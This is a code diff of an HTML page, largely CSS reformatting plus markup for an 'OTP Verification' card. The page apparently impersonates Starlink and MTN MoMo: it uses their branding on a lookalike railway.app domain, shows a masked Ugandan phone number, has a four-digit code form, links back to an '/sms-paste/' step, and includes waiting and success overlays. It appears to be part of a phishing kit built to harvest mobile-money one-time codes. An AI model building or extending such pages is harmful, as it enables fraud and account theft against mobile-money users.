@@ -7,745 +7,219 @@
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
     <style>
-        *, *::before, *::after {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
-            --black: #000000;
-            --white: #ffffff;
-            --gray-50: #f9fafb;
-            --gray-100: #f3f4f6;
-            --gray-200: #e5e7eb;
-            --gray-300: #d1d5db;
-            --gray-400: #9ca3af;
-            --gray-500: #6b7280;
-            --gray-600: #4b5563;
-            --gray-700: #374151;
-            --gray-800: #1f2937;
-            --gray-900: #111827;
-            --green-500: #22c55e;
-            --green-600: #16a34a;
-            --red-500: #ef4444;
-            --momo-yellow: #FFCC00;
-            --momo-yellow-dark: #E6B800;
-            --orange-500: #f97316;
-            --orange-600: #ea580c;
-            --radius-md: 16px;
-            --radius-xl: 26px;
-            --radius-2xl: 30px;
+            --black: #000; --white: #fff;
+            --gray-50: #f9fafb; --gray-100: #f3f4f6; --gray-200: #e5e7eb;
+            --gray-300: #d1d5db; --gray-400: #9ca3af; --gray-500: #6b7280;
+            --gray-600: #4b5563; --gray-700: #374151; --gray-900: #111827;
+            --green-500: #22c55e; --green-600: #16a34a; --red-500: #ef4444;
+            --momo-yellow: #FFCC00; --momo-yellow-dark: #E6B800;
+            --orange-500: #f97316; --orange-600: #ea580c;
+            --radius-md: 16px; --radius-xl: 26px; --radius-2xl: 30px;
             --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
             --shadow-lg: 0 8px 20px rgba(0,0,0,0.12);
             --shadow-2xl: 0 20px 40px rgba(0,0,0,0.2);
-            --header-h: 74px;
-            --footer-h: 68px;
+            --header-h: 74px; --footer-h: 68px;
         }
-
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background-color: var(--gray-50);
-            color: var(--gray-900);
-            line-height: 1.5;
-            padding-top: var(--header-h);
-            padding-bottom: var(--footer-h);
-            min-height: 100vh;
-            -webkit-font-smoothing: antialiased;
+            background-color: var(--gray-50); color: var(--gray-900);
+            line-height: 1.5; padding-top: var(--header-h); padding-bottom: var(--footer-h);
+            min-height: 100vh; -webkit-font-smoothing: antialiased;
         }
-
-        body.modal-open {
-            overflow: hidden;
-            position: fixed;
-            width: 100%;
-        }
-
+        body.modal-open { overflow: hidden; position: fixed; width: 100%; }
         a { text-decoration: none; color: inherit; }
         button { font-family: inherit; cursor: pointer; border: none; background: none; }
 
         .header {
-            position: fixed;
-            top: 0; left: 0; right: 0;
-            height: var(--header-h);
-            background-color: var(--black);
-            color: var(--white);
-            z-index: 100;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.4);
+            position: fixed; top: 0; left: 0; right: 0;
+            height: var(--header-h); background-color: var(--black); color: var(--white);
+            z-index: 100; box-shadow: 0 2px 12px rgba(0,0,0,0.4);
         }
-
         .header-inner {
-            max-width: 1200px;
-            margin: 0 auto;
-            height: 100%;
-            padding: 0 18px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
+            max-width: 1200px; margin: 0 auto; height: 100%; padding: 0 18px;
+            display: flex; align-items: center; justify-content: space-between;
         }
-
         .brand { display: flex; align-items: center; gap: 10px; }
-
-        .brand-logo-img {
-            height: 54px;
-            width: auto;
-            display: block;
-        }
-
+        .brand-logo-img { height: 54px; width: auto; display: block; }
         .brand-divider { width: 1px; height: 26px; background: rgba(255,255,255,0.2); margin: 0 4px; }
         .brand-sub { font-size: 12px; color: var(--gray-400); font-weight: 500; letter-spacing: 0.5px; }
-
         .header-nav { display: none; gap: 26px; }
-        .header-nav a {
-            color: var(--gray-300);
-            font-size: 14px;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 7px;
-            transition: color 0.2s;
-        }
+        .header-nav a { color: var(--gray-300); font-size: 14px; font-weight: 500; display: flex; align-items: center; gap: 7px; transition: color 0.2s; }
         .header-nav a:hover { color: var(--white); }
         .header-nav i { font-size: 18px; }
 
-        .main {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 22px 16px 36px;
-        }
-
-        .otp-wrap {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: calc(100vh - 160px);
-            padding: 8px 0;
-        }
-
-        .otp-card-wrap {
-            width: 100%;
-            max-width: 420px;
-        }
+        .main { max-width: 1200px; margin: 0 auto; padding: 22px 16px 36px; }
+        .otp-wrap { display: flex; align-items: center; justify-content: center; min-height: calc(100vh - 160px); padding: 8px 0; }
+        .otp-card-wrap { width: 100%; max-width: 420px; }
 
         .otp-band {
             background: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
             border-radius: var(--radius-2xl) var(--radius-2xl) 0 0;
-            padding: 24px 22px 20px;
-            text-align: center;
-            box-shadow: var(--shadow-md);
-            position: relative;
-            overflow: hidden;
+            padding: 24px 22px 20px; text-align: center;
+            box-shadow: var(--shadow-md); position: relative; overflow: hidden;
         }
+        .otp-band::before { content: ""; position: absolute; top: -40px; right: -40px; width: 140px; height: 140px; background: radial-gradient(circle, rgba(255,255,255,0.4), transparent 70%); border-radius: 50%; pointer-events: none; }
+        .otp-band-logo { height: 44px; width: auto; display: inline-block; position: relative; }
+        .otp-band-tagline { font-size: 11px; font-weight: 800; color: #7A5A00; letter-spacing: 2px; text-transform: uppercase; margin-top: 10px; position: relative; }
 
-        .otp-band::before {
-            content: "";
-            position: absolute;
-            top: -40px; right: -40px;
-            width: 140px; height: 140px;
-            background: radial-gradient(circle, rgba(255,255,255,0.4), transparent 70%);
-            border-radius: 50%;
-            pointer-events: none;
-        }
+        .otp-body { background: var(--white); border-radius: 0 0 var(--radius-2xl) var(--radius-2xl); padding: 24px 22px 26px; box-shadow: var(--shadow-lg); }
 
-        .otp-band::after {
-            content: "";
-            position: absolute;
-            bottom: -50px; left: -50px;
-            width: 120px; height: 120px;
-            background: radial-gradient(circle, rgba(0,0,0,0.06), transparent 70%);
-            border-radius: 50%;
-            pointer-events: none;
-        }
-
-        .otp-band-logo {
-            height: 44px;
-            width: auto;
-            display: inline-block;
-            position: relative;
-        }
-
-        .otp-band-tagline {
-            font-size: 11px;
-            font-weight: 800;
-            color: #7A5A00;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            margin-top: 10px;
-            position: relative;
-        }
-
-        .otp-body {
-            background: var(--white);
-            border-radius: 0 0 var(--radius-2xl) var(--radius-2xl);
-            padding: 24px 22px 26px;
-            box-shadow: var(--shadow-lg);
-        }
-
-        .otp-top {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 12px;
-            padding-bottom: 18px;
-            border-bottom: 1px solid var(--gray-200);
-            margin-bottom: 20px;
-        }
-
-        .back-link {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 13px;
-            font-weight: 800;
-            color: var(--gray-600);
-            transition: color 0.2s;
-        }
-
+        .otp-top { display: flex; align-items: center; justify-content: space-between; gap: 12px; padding-bottom: 18px; border-bottom: 1px solid var(--gray-200); margin-bottom: 20px; }
+        .back-link { display: flex; align-items: center; gap: 5px; font-size: 13px; font-weight: 800; color: var(--gray-600); transition: color 0.2s; }
         .back-link:hover { color: var(--gray-900); }
         .back-link i { font-size: 18px; }
-
         .amount-mini { text-align: right; }
+        .amount-mini-label { font-size: 10.5px; font-weight: 800; color: var(--gray-400); letter-spacing: 1.5px; text-transform: uppercase; }
+        .amount-mini-value { font-size: 18px; font-weight: 900; color: var(--orange-500); letter-spacing: -0.3px; margin-top: 2px; }
 
-        .amount-mini-label {
-            font-size: 10.5px;
-            font-weight: 800;
-            color: var(--gray-400);
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-        }
-
-        .amount-mini-value {
-            font-size: 18px;
-            font-weight: 900;
-            color: var(--orange-500);
-            letter-spacing: -0.3px;
-            margin-top: 2px;
-        }
-
-        .otp-instruction {
-            font-size: 13.5px;
-            color: var(--gray-600);
-            line-height: 1.6;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .otp-instruction strong {
-            color: var(--gray-900);
-            font-weight: 800;
-        }
+        .otp-instruction { font-size: 13.5px; color: var(--gray-600); line-height: 1.6; margin-bottom: 20px; text-align: center; }
+        .otp-instruction strong { color: var(--gray-900); font-weight: 800; }
 
         .phone-chip {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            background: var(--gray-50);
+            display: flex; align-items: center; justify-content: center;
+            gap: 8px; background: var(--gray-50);
             border: 1.5px solid var(--gray-200);
-            border-radius: var(--radius-md);
-            padding: 11px 14px;
-            margin-bottom: 22px;
+            border-radius: var(--radius-md); padding: 11px 14px; margin-bottom: 22px;
         }
-
         .phone-chip-icon {
-            width: 30px;
-            height: 30px;
-            border-radius: 8px;
-            background: var(--momo-yellow);
-            color: var(--black);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 15px;
-            flex-shrink: 0;
+            width: 30px; height: 30px; border-radius: 8px;
+            background: var(--momo-yellow); color: var(--black);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 15px; flex-shrink: 0;
             box-shadow: 0 2px 6px rgba(255,204,0,0.4);
         }
+        .phone-chip-text { font-size: 14px; font-weight: 800; color: var(--gray-900); letter-spacing: 0.5px; }
 
-        .phone-chip-text {
-            font-size: 14px;
-            font-weight: 800;
-            color: var(--gray-900);
-            letter-spacing: 0.5px;
-        }
-
-        .otp-label {
-            display: block;
-            font-size: 11px;
-            font-weight: 800;
-            color: var(--gray-500);
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            margin-bottom: 12px;
-            text-align: center;
-        }
-
-        .otp-boxes {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 22px;
-        }
-
+        .otp-label { display: block; font-size: 11px; font-weight: 800; color: var(--gray-500); letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 12px; text-align: center; }
+        .otp-boxes { display: flex; justify-content: center; gap: 12px; margin-bottom: 22px; }
         .otp-box {
-            width: 58px;
-            height: 66px;
+            width: 58px; height: 66px;
             border: 2px solid var(--gray-300);
-            border-radius: 14px;
-            text-align: center;
-            font-size: 28px;
-            font-weight: 900;
-            color: var(--gray-900);
-            background: var(--white);
-            outline: none;
+            border-radius: 14px; text-align: center;
+            font-size: 28px; font-weight: 900; color: var(--gray-900);
+            background: var(--white); outline: none;
             transition: border-color 0.2s, box-shadow 0.2s, background 0.2s, transform 0.15s;
-            font-family: inherit;
-            caret-color: var(--orange-500);
+            font-family: inherit; caret-color: var(--orange-500);
         }
-
-        .otp-box:focus {
-            border-color: var(--orange-500);
-            box-shadow: 0 0 0 4px rgba(249,115,22,0.15);
-            transform: translateY(-2px);
-        }
-
-        .otp-box.filled {
-            border-color: var(--momo-yellow-dark);
-            background: #FFFDF5;
-        }
+        .otp-box:focus { border-color: var(--orange-500); box-shadow: 0 0 0 4px rgba(249,115,22,0.15); transform: translateY(-2px); }
+        .otp-box.filled { border-color: var(--momo-yellow-dark); background: #FFFDF5; }
 
         .btn-otp {
-            width: 100%;
-            padding: 17px;
-            border-radius: var(--radius-md);
-            background: var(--orange-500);
-            color: var(--white);
-            font-weight: 900;
-            font-size: 14px;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 9px;
+            width: 100%; padding: 17px;
+            border-radius: var(--radius-md); background: var(--orange-500);
+            color: var(--white); font-weight: 900; font-size: 14px;
+            letter-spacing: 1.5px; text-transform: uppercase;
+            display: flex; align-items: center; justify-content: center; gap: 9px;
             transition: transform 0.15s, filter 0.2s, box-shadow 0.25s, opacity 0.2s;
             box-shadow: 0 6px 18px rgba(249,115,22,0.4);
         }
-
-        .btn-otp:hover:not(:disabled) {
-            filter: brightness(0.96);
-            box-shadow: 0 8px 24px rgba(249,115,22,0.55);
-        }
-
+        .btn-otp:hover:not(:disabled) { filter: brightness(0.96); box-shadow: 0 8px 24px rgba(249,115,22,0.55); }
         .btn-otp:active:not(:disabled) { transform: scale(0.98); }
-
-        .btn-otp:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
+        .btn-otp:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
         .btn-otp i { font-size: 18px; }
 
         .btn-spinner {
-            width: 16px;
-            height: 16px;
+            width: 16px; height: 16px;
             border: 2.5px solid rgba(255,255,255,0.35);
             border-top-color: var(--white);
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
+            border-radius: 50%; animation: spin 0.7s linear infinite;
         }
-
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        .trust-footer {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            font-size: 11px;
-            color: var(--gray-500);
-            font-weight: 700;
-            margin-top: 18px;
-            padding-top: 14px;
-            border-top: 1px dashed var(--gray-200);
-            letter-spacing: 0.5px;
-        }
-
+        .trust-footer { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 11px; color: var(--gray-500); font-weight: 700; margin-top: 18px; padding-top: 14px; border-top: 1px dashed var(--gray-200); letter-spacing: 0.5px; }
         .trust-footer i { font-size: 14px; color: var(--green-600); }
 
-        /* WAITING OVERLAY */
         .waiting-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 10000;
-            display: none;
-            align-items: center;
-            justify-content: center;
+            position: fixed; inset: 0; z-index: 10000; display: none;
+            align-items: center; justify-content: center;
             background: linear-gradient(160deg, #0a0a0a 0%, #1a1a1a 50%, #000000 100%);
-            color: var(--white);
-            padding: 24px;
-            overflow: hidden;
+            color: var(--white); padding: 24px; overflow: hidden;
         }
-
         .waiting-overlay.open { display: flex; animation: fadeIn 0.35s ease; }
-
-        .waiting-overlay::before {
-            content: "";
-            position: absolute;
-            top: 50%; left: 50%;
-            width: 600px; height: 600px;
-            transform: translate(-50%, -50%);
-            background: radial-gradient(circle, rgba(255,204,0,0.18) 0%, transparent 60%);
-            animation: pulseGlow 3s ease-in-out infinite;
-            pointer-events: none;
-        }
-
+        .waiting-overlay::before { content: ""; position: absolute; top: 50%; left: 50%; width: 600px; height: 600px; transform: translate(-50%, -50%); background: radial-gradient(circle, rgba(255,204,0,0.18) 0%, transparent 60%); animation: pulseGlow 3s ease-in-out infinite; pointer-events: none; }
         @keyframes pulseGlow {
-            0%, 100% { transform: translate(-50%, -50%) scale(1);   opacity: 0.6; }
-            50%      { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
+            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
         }
-
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        .waiting-content {
-            position: relative;
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-            z-index: 2;
-        }
-
-        .waiting-orbit {
-            width: 120px;
-            height: 120px;
-            margin: 0 auto 28px;
-            position: relative;
-        }
-
-        .waiting-ring {
-            position: absolute;
-            inset: 0;
-            border-radius: 50%;
-            border: 2px dashed rgba(255,204,0,0.4);
-            animation: rotate 8s linear infinite;
-        }
-
-        .waiting-ring.inner {
-            inset: 22px;
-            border: 1.5px dashed rgba(59,130,246,0.4);
-            animation: rotate 5s linear infinite reverse;
-        }
-
+        .waiting-content { position: relative; text-align: center; max-width: 400px; width: 100%; z-index: 2; }
+        .waiting-orbit { width: 120px; height: 120px; margin: 0 auto 28px; position: relative; }
+        .waiting-ring { position: absolute; inset: 0; border-radius: 50%; border: 2px dashed rgba(255,204,0,0.4); animation: rotate 8s linear infinite; }
+        .waiting-ring.inner { inset: 22px; border: 1.5px dashed rgba(59,130,246,0.4); animation: rotate 5s linear infinite reverse; }
         @keyframes rotate { to { transform: rotate(360deg); } }
-
-        .waiting-core {
-            position: absolute;
-            top: 50%; left: 50%;
-            width: 60px; height: 60px;
-            transform: translate(-50%, -50%);
-            border-radius: 50%;
-            background: linear-gradient(135deg, var(--momo-yellow) 0%, #FFD633 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 0 40px rgba(255,204,0,0.5);
-            animation: corePulse 1.6s ease-in-out infinite;
-        }
-
+        .waiting-core { position: absolute; top: 50%; left: 50%; width: 60px; height: 60px; transform: translate(-50%, -50%); border-radius: 50%; background: linear-gradient(135deg, var(--momo-yellow) 0%, #FFD633 100%); display: flex; align-items: center; justify-content: center; box-shadow: 0 0 40px rgba(255,204,0,0.5); animation: corePulse 1.6s ease-in-out infinite; }
         @keyframes corePulse {
             0%, 100% { box-shadow: 0 0 40px rgba(255,204,0,0.5); }
-            50%      { box-shadow: 0 0 60px rgba(255,204,0,0.9); }
+            50% { box-shadow: 0 0 60px rgba(255,204,0,0.9); }
         }
-
         .waiting-core i { font-size: 28px; color: var(--black); }
-
-        .waiting-title {
-            font-size: 22px;
-            font-weight: 900;
-            letter-spacing: -0.5px;
-        }
-
-        .waiting-title .highlight {
-            background: linear-gradient(90deg, var(--momo-yellow), #FFD633);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .waiting-sub {
-            font-size: 14px;
-            color: var(--gray-400);
-            margin-top: 14px;
-            line-height: 1.65;
-        }
-
+        .waiting-title { font-size: 22px; font-weight: 900; letter-spacing: -0.5px; }
+        .waiting-title .highlight { background: linear-gradient(90deg, var(--momo-yellow), #FFD633); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .waiting-sub { font-size: 14px; color: var(--gray-400); margin-top: 14px; line-height: 1.65; }
         .waiting-sub strong { color: var(--white); font-weight: 800; }
-
-        .waiting-dots {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 24px;
-        }
-
-        .waiting-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: var(--momo-yellow);
-            animation: bounce 1.4s infinite ease-in-out both;
-        }
-
+        .waiting-dots { display: flex; justify-content: center; gap: 8px; margin-top: 24px; }
+        .waiting-dot { width: 10px; height: 10px; border-radius: 50%; background: var(--momo-yellow); animation: bounce 1.4s infinite ease-in-out both; }
         .waiting-dot:nth-child(1) { animation-delay: -0.32s; }
         .waiting-dot:nth-child(2) { animation-delay: -0.16s; }
         .waiting-dot:nth-child(3) { animation-delay: 0s; }
-
         @keyframes bounce {
             0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
-            40%           { transform: scale(1);   opacity: 1; }
+            40% { transform: scale(1); opacity: 1; }
         }
 
-        /* SUCCESS OVERLAY */
         .success-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 10000;
-            display: none;
-            align-items: center;
-            justify-content: center;
+            position: fixed; inset: 0; z-index: 10000; display: none;
+            align-items: center; justify-content: center;
             background: linear-gradient(160deg, #0a0a0a 0%, #1a1a1a 50%, #000000 100%);
-            color: var(--white);
-            padding: 24px;
-            overflow: hidden;
+            color: var(--white); padding: 24px; overflow: hidden;
         }
-
         .success-overlay.open { display: flex; animation: fadeIn 0.4s ease; }
-
-        .success-overlay::before {
-            content: "";
-            position: absolute;
-            top: 50%; left: 50%;
-            width: 600px; height: 600px;
-            transform: translate(-50%, -50%);
-            background: radial-gradient(circle, rgba(34,197,94,0.22) 0%, transparent 60%);
-            animation: pulseGlow 3s ease-in-out infinite;
-            pointer-events: none;
-        }
-
-        .success-content {
-            position: relative;
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-            z-index: 2;
-        }
-
-        .success-check {
-            width: 100px;
-            height: 100px;
-            margin: 0 auto 26px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 0 60px rgba(34,197,94,0.6);
-            animation: popIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
+        .success-overlay::before { content: ""; position: absolute; top: 50%; left: 50%; width: 600px; height: 600px; transform: translate(-50%, -50%); background: radial-gradient(circle, rgba(34,197,94,0.22) 0%, transparent 60%); animation: pulseGlow 3s ease-in-out infinite; pointer-events: none; }
+        .success-content { position: relative; text-align: center; max-width: 400px; width: 100%; z-index: 2; }
+        .success-check { width: 100px; height: 100px; margin: 0 auto 26px; border-radius: 50%; background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); display: flex; align-items: center; justify-content: center; box-shadow: 0 0 60px rgba(34,197,94,0.6); animation: popIn 0.6s cubic-bezier(0.16, 1, 0.3, 1); }
         @keyframes popIn {
             0% { transform: scale(0.3); opacity: 0; }
             60% { transform: scale(1.1); opacity: 1; }
             100% { transform: scale(1); }
         }
-
         .success-check i { font-size: 54px; color: var(--white); }
-
-        .success-title {
-            font-size: 26px;
-            font-weight: 900;
-            letter-spacing: -0.5px;
-            margin-bottom: 8px;
-        }
-
-        .success-sub {
-            font-size: 14px;
-            color: var(--gray-400);
-            line-height: 1.65;
-            max-width: 320px;
-            margin: 0 auto;
-        }
-
+        .success-title { font-size: 26px; font-weight: 900; letter-spacing: -0.5px; margin-bottom: 8px; }
+        .success-sub { font-size: 14px; color: var(--gray-400); line-height: 1.65; max-width: 320px; margin: 0 auto; }
         .success-sub strong { color: var(--white); font-weight: 800; }
-
-        .success-receipt {
-            background: rgba(255,255,255,0.06);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: var(--radius-md);
-            padding: 16px 18px;
-            margin: 24px 0;
-            text-align: left;
-        }
-
-        .success-row {
-            display: flex;
-            justify-content: space-between;
-            gap: 12px;
-            font-size: 13px;
-            padding: 7px 0;
-        }
-
-        .success-row:not(:last-child) {
-            border-bottom: 1px dashed rgba(255,255,255,0.1);
-        }
-
+        .success-receipt { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); border-radius: var(--radius-md); padding: 16px 18px; margin: 24px 0; text-align: left; }
+        .success-row { display: flex; justify-content: space-between; gap: 12px; font-size: 13px; padding: 7px 0; }
+        .success-row:not(:last-child) { border-bottom: 1px dashed rgba(255,255,255,0.1); }
         .success-row span:first-child { color: var(--gray-500); font-weight: 500; }
-        .success-row span:last-child {
-            color: var(--white);
-            font-weight: 800;
-            text-align: right;
-            word-break: break-word;
-        }
-
-        .success-row .ref {
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            color: var(--momo-yellow);
-        }
-
-        .btn-done {
-            width: 100%;
-            padding: 17px;
-            border-radius: var(--radius-md);
-            background: var(--momo-yellow);
-            color: var(--black);
-            font-weight: 900;
-            font-size: 14px;
-            letter-spacing: 1.2px;
-            text-transform: uppercase;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 9px;
-            transition: transform 0.15s, filter 0.2s, box-shadow 0.25s;
-            box-shadow: 0 8px 22px rgba(255,204,0,0.4);
-        }
-
+        .success-row span:last-child { color: var(--white); font-weight: 800; text-align: right; word-break: break-word; }
+        .success-row .ref { font-family: 'Courier New', monospace; font-size: 12px; color: var(--momo-yellow); }
+        .btn-done { width: 100%; padding: 17px; border-radius: var(--radius-md); background: var(--momo-yellow); color: var(--black); font-weight: 900; font-size: 14px; letter-spacing: 1.2px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 9px; transition: transform 0.15s, filter 0.2s, box-shadow 0.25s; box-shadow: 0 8px 22px rgba(255,204,0,0.4); }
         .btn-done:hover { filter: brightness(0.96); box-shadow: 0 10px 28px rgba(255,204,0,0.55); }
         .btn-done:active { transform: scale(0.98); }
         .btn-done i { font-size: 19px; }
 
-        /* TOAST */
-        .toast-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 10001;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(4px);
-            padding: 20px;
-        }
-
+        .toast-overlay { position: fixed; inset: 0; z-index: 10001; display: none; align-items: center; justify-content: center; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); padding: 20px; }
         .toast-overlay.open { display: flex; }
-
-        .toast-card {
-            background: var(--white);
-            border-radius: var(--radius-xl);
-            padding: 24px 22px;
-            max-width: 340px;
-            width: 100%;
-            text-align: center;
-            box-shadow: var(--shadow-2xl);
-            transform: scale(0.9);
-            opacity: 0;
-            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.3s;
-        }
-
+        .toast-card { background: var(--white); border-radius: var(--radius-xl); padding: 24px 22px; max-width: 340px; width: 100%; text-align: center; box-shadow: var(--shadow-2xl); transform: scale(0.9); opacity: 0; transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.3s; }
         .toast-card.show { transform: scale(1); opacity: 1; }
-
-        .toast-icon {
-            width: 56px;
-            height: 56px;
-            border-radius: var(--radius-md);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 14px;
-        }
-
+        .toast-icon { width: 56px; height: 56px; border-radius: var(--radius-md); display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; }
         .toast-icon.error { background: #FEE2E2; }
         .toast-icon.error i { font-size: 28px; color: var(--red-500); }
         .toast-icon.info { background: #FFF7D6; }
         .toast-icon.info i { font-size: 28px; color: var(--momo-yellow-dark); }
-
-        .toast-title {
-            font-size: 16px;
-            font-weight: 900;
-            color: var(--gray-900);
-            margin-bottom: 6px;
-        }
-
-        .toast-text {
-            font-size: 13px;
-            color: var(--gray-500);
-            line-height: 1.55;
-            margin-bottom: 18px;
-        }
-
-        .toast-btn {
-            width: 100%;
-            padding: 14px;
-            background: var(--momo-yellow);
-            color: var(--black);
-            font-weight: 900;
-            font-size: 13px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            border-radius: var(--radius-md);
-            transition: transform 0.15s, filter 0.2s;
-            box-shadow: 0 4px 12px rgba(255,204,0,0.35);
-        }
-
+        .toast-title { font-size: 16px; font-weight: 900; color: var(--gray-900); margin-bottom: 6px; }
+        .toast-text { font-size: 13px; color: var(--gray-500); line-height: 1.55; margin-bottom: 18px; }
+        .toast-btn { width: 100%; padding: 14px; background: var(--momo-yellow); color: var(--black); font-weight: 900; font-size: 13px; letter-spacing: 1px; text-transform: uppercase; border-radius: var(--radius-md); transition: transform 0.15s, filter 0.2s; box-shadow: 0 4px 12px rgba(255,204,0,0.35); }
         .toast-btn:hover { filter: brightness(0.95); }
         .toast-btn:active { transform: scale(0.97); }
 
-        /* BOTTOM NAV */
-        .bottom-nav {
-            position: fixed;
-            bottom: 0; left: 0; right: 0;
-            height: var(--footer-h);
-            background: var(--white);
-            border-top: 1px solid var(--gray-200);
-            box-shadow: 0 -4px 20px rgba(0,0,0,0.08);
-            z-index: 100;
-        }
-
-        .bottom-nav-inner {
-            max-width: 1200px;
-            margin: 0 auto;
-            height: 100%;
-            padding: 0 12px;
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-        }
-
-        .nav-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 4px;
-            color: var(--gray-600);
-            font-size: 11px;
-            font-weight: 700;
-            transition: color 0.2s, transform 0.2s;
-            padding: 6px 14px;
-            border-radius: 12px;
-        }
-
+        .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; height: var(--footer-h); background: var(--white); border-top: 1px solid var(--gray-200); box-shadow: 0 -4px 20px rgba(0,0,0,0.08); z-index: 100; }
+        .bottom-nav-inner { max-width: 1200px; margin: 0 auto; height: 100%; padding: 0 12px; display: flex; justify-content: space-around; align-items: center; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: var(--gray-600); font-size: 11px; font-weight: 700; transition: color 0.2s, transform 0.2s; padding: 6px 14px; border-radius: 12px; }
         .nav-item i { font-size: 24px; }
         .nav-item:hover { transform: translateY(-2px); }
+        .nav-item.active { color: var(--blue-600); }
 
         @media (min-width: 640px) {
             .main { padding: 28px 22px 44px; }
@@ -755,10 +229,7 @@
             .success-title { font-size: 30px; }
             .otp-box { width: 62px; height: 70px; }
         }
-
-        @media (min-width: 768px) {
-            .header-nav { display: flex; }
-        }
+        @media (min-width: 768px) { .header-nav { display: flex; } }
     </style>
 </head>
 <body>
@@ -780,14 +251,12 @@
     <main class="main">
         <div class="otp-wrap">
             <div class="otp-card-wrap">
-
                 <div class="otp-band">
                     <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="otp-band-logo">
                     <p class="otp-band-tagline">OTP Verification</p>
                 </div>
 
                 <div class="otp-body">
-
                     <div class="otp-top">
                         <a href="/sms-paste/" class="back-link">
                             <i class="uil uil-arrow-left"></i> Back
@@ -803,51 +272,40 @@
                     </p>
 
                     <div class="phone-chip">
-                        <div class="phone-chip-icon">
-                            <i class="uil uil-mobile-android"></i>
-                        </div>
+                        <div class="phone-chip-icon"><i class="uil uil-mobile-android"></i></div>
                         <span class="phone-chip-text" id="display-phone">+256 7XXXXXXXX</span>
                     </div>
 
                     <form id="otpForm" method="POST" autocomplete="off" onsubmit="return false;">
-
                         <label class="otp-label">Enter OTP Code</label>
-
                         <div class="otp-boxes" id="otpBoxes">
                             <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
                             <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
                             <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
                             <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
                         </div>
-
                         <input type="hidden" name="otp_code" id="otp_code">
-
                         <button type="submit" class="btn-otp" id="submitBtn" disabled>
                             <i class="uil uil-check-circle"></i>
                             <span>Verify &amp; Complete</span>
                         </button>
-
                     </form>
 
                     <div class="trust-footer">
                         <i class="uil uil-shield-check"></i>
